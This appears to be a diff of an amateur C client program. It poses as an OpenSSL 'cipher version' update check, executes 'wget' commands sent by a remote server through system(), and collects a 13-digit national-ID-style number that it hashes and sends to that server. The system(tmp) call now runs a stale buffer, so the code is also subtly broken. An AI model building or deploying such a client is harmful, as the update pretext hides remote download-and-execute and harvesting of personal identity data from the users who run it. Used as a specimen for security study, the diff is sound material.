@@ -15,8 +15,6 @@ int check_cipher(int sock, char buf[]);
 int input_send_privacy(int sock);
 int getch();
 
-int *SHA256()
-
 typedef struct SHA256state_st SHA256_CTX;
 
 int main(){
@@ -32,7 +30,7 @@ int main(){
     memset(&server_addr, 0, sizeof(server_addr));
 
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(50000);
+    server_addr.sin_port = htons(15100);
     server_addr.sin_addr.s_addr = inet_addr("10.178.0.2");
     // = inet_pton( AF_INET, "34.64.182.41", &server_addr.sin_addr.s_addr );
 
@@ -40,38 +38,43 @@ int main(){
         printf("failed connect func\n");
         exit(0);
     }
-
+printf("1\n");
     while((i = read(sock, buf, Buf_len)) > 0){
         buf[i] = '\0';
         if(strncmp(buf, "Check", 5) == 0){ // 2
             err = check_cipher(sock, buf);
             if(err == 0){
-                sprintf(buf, "fail", NULL);
+                sprintf(buf, "fail");
                 write(sock, buf, strlen(buf));
                 break;
             }
-            read(sock, buf, Buf_len);
-            strcpy(tmp, buf);
-            buf[4] = '\0';
-            if(strcmp(buf, "wget") == 0) system(tmp);
+            i = read(sock, buf, Buf_len);
+            buf[i] = '\0';
+            if(strncmp(buf, "wget", 4) == 0) system(tmp);
         }
         else if(strncmp(buf, "Input", 5) == 0){ // 3
             printf("%s", buf);
             err = input_send_privacy(sock);
+printf("send privacy done\n");
             if(err == 0) break;
         }
         else if(strncmp(buf, "If", 2) == 0){ // b
-            scanf("%d", type_num);
-            write(sock, type_num, strlen(type_num));
+            printf("%s\n", buf);
+            fgets(buf, Buf_len, stdin);
+            buf[1] = '\0';
+            write(sock, buf, strlen(buf));
+printf("%s - b done\n", buf);
         }
         else if(strncmp(buf, "result", 5) == 0){ // 6
-            read(sock, buf, Buf_len);
+            i = read(sock, buf, Buf_len);
+            buf[i] = '\0';
             printf("%s\n", buf);
             break;
         }
         else{ // 5 / c
             printf("%s\n", buf);
             fgets(buf, Buf_len, stdin);
+            buf[strlen(buf)-1] = '\0';
             write(sock, buf, strlen(buf));
         }
     }
@@ -89,18 +92,19 @@ int check_cipher(int sock, char buf[]){
     
     printf("%s\n", tmpbuf);
     while(1){
-        scanf("%s", tmpbuf);
-        if(strcmp((int)tmpbuf[0], 'y') || strcmp((int)tmpbuf[0], 'Y')){
-            if(strcmp((int)tmpbuf[1], 'e') || strcmp((int)tmpbuf[1], 'E')){
-                if(strcmp((int)tmpbuf[2], 's') || strcmp((int)tmpbuf[2], 'S')) err = 1;
+        fgets(tmpbuf, sizeof(tmpbuf), stdin);
+        tmpbuf[strlen(tmpbuf)-1] = '\0';
+        if((int)tmpbuf[0] == 'y' || (int)tmpbuf[0] == 'Y'){
+            if((int)tmpbuf[1] == 'e' || (int)tmpbuf[1] == 'E'){
+                if((int)tmpbuf[2] == 's' || (int)tmpbuf[2] == 'S') err = 1;
                 else err = 0;
             }
             else err = 0;
         }
         else err = 0;
 
-        if(strcmp((int)tmpbuf[0], 'n') || strcmp((int)tmpbuf[0], 'N')){
-            if(strcmp((int)tmpbuf[1], 'o') || strcmp((int)tmpbuf[1], 'O')){
+        if((int)tmpbuf[0] == 'n' || (int)tmpbuf[0] == 'N'){
+            if((int)tmpbuf[1] == 'o' || (int)tmpbuf[1] == 'O'){
                 printf("If you don't want to upadte cipher version\n");
                 printf("Vulnerahble we can do nothing!!\n");
                 printf("Please attempt to when you think updating cipher version.\n");
@@ -109,7 +113,7 @@ int check_cipher(int sock, char buf[]){
         }
 
         if(err == 1){   // cipher version 확인
-            system("openssl version > version.txt");
+            system("openssl version > ./version.txt");
             FILE *ver_fd;
             ver_fd = fopen("version.txt", "r");
             fgets(buf, Buf_len, ver_fd);
@@ -124,31 +128,30 @@ int check_cipher(int sock, char buf[]){
 }
 
 int input_send_privacy(int sock){
-    char buf[Buf_len], privacy[14];
+    char buf[Buf_len], privacy[14], result_hash[65];
     int i, err = 2;
     //sha
     SHA256_CTX sha256;
-    char sha256_val[SHA256_DIGEST_LENGTH]; // SHA256_DIGEST_LENGTH = 32
+    unsigned char hash[SHA256_DIGEST_LENGTH]; // SHA256_DIGEST_LENGTH = 32
 
     for(i = 0; i < 13; i++){
         privacy[i] = getch();
-
-        if((int)privacy[i] == 8) i--;
-        else if((int)privacy[i] == 13){
-            if(err == 2){
-                printf("Please input 13 character.(remain 1 chance)\n");
-                printf("Input : ");
-                i = -1;
-            }
+        if((int)privacy[i] == 10){
+            printf("Input 13 numbers\n");
             err--;
+            i = -1;
         }
-        else if(strcmp(privacy[6], '1') || strcmp(privacy[6], '2') || strcmp(privacy[6], '3') || strcmp(privacy[6], '4')){
-            if(err == 2){
+        else if((int)privacy[i] == 127){
+            err--;
+            i = -1;
+        }
+        else if(i == 6){
+            if(!((int)privacy[6] == '1' || (int)privacy[6] == '2' || (int)privacy[6] == '3' || (int)privacy[6] == '4') && err == 2){
                 printf("First number of back part is incorrect.\n");
                 printf("Input : ");
                 i = -1;
+                err--;
             }
-            err--;
         }
         else if((int)privacy[i] < 48 || 57 < (int)privacy[i]){
             if(err == 2){
@@ -164,15 +167,22 @@ int input_send_privacy(int sock){
             break;
         }
     }
+    privacy[13] = '\0';
 
     if(err != 0){ // Make hash and write
-        SHA_Init(&sha256);
-        SHA256_Upadate(&sha256, privacy, strlen(privacy));
-        SHA256_Final(sha256_val, &sha256);
-        write(sock, sha256_val, strlen(sha256_val));
+        SHA256_Init(&sha256);
+        SHA256_Update(&sha256, privacy, strlen(privacy));
+        SHA256_Final(hash, &sha256);
+
+        // transform to heximal
+        for(i = 0; i < 32; i++){
+            sprintf(result_hash + (i * 2), "%02x", hash[i]);
+        }
+        result_hash[64] = '\0';
+        write(sock, result_hash, strlen(result_hash));
     }
     else if(err == 0){
-        sprintf(buf, "fail", NULL);
+        sprintf(buf, "fail");
         write(sock, buf, strlen(buf));
     }
 
